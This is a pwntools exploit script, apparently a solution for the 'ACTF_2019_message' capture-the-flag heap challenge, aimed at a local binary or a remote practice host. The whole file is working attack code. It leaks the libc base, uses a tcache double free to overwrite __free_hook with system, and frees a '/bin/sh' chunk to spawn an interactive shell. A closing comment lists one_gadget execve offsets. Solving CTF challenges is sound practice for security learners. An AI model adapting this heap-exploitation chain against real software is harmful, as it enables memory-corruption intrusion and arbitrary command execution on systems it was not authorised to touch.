#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./ACTF_2019_message')
	elf = ELF('./ACTF_2019_message',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

else:
	p = remote('node3.buuoj.cn',29319)
	elf = ELF('./ACTF_2019_message',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

def menu(cmd):
    sla("What's your choice: ",str(cmd))

def add(size,content):
    menu(1)
    sla("of message:",str(size))
    sda("message:",content)

def delete(idx):
    menu(2)
    sla("to delete:",str(idx))

def edit(idx,content):
    menu(3)
    sla("to edit:",str(idx))
    sla("message:",content)

def show(idx):
    menu(4)
    sla("to display:",str(idx))


###leak libc###
add(0x410,'leak libc')#0
add(0x60,'/bin/sh\x00')#1

delete(0)


add(0x410,'aaaaaaaa')#2

show(2)

libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 96 - 0x3ebc40
success('libc base:'+hex(libc_base))

###tcache dup###
one_gadget = libc_base + 0x10a45c
malloc_hook = libc_base + libc.symbols['__malloc_hook']
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

add(0x60,'tcache')#3

delete(3)
delete(3)

add(0x60,p64(free_hook))

add(0x60,'tcache')#4
add(0x60,p64(system))#5

#gdb.attach(p)
###get shell###
delete(1)
sleep(1)
ia()

'''
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''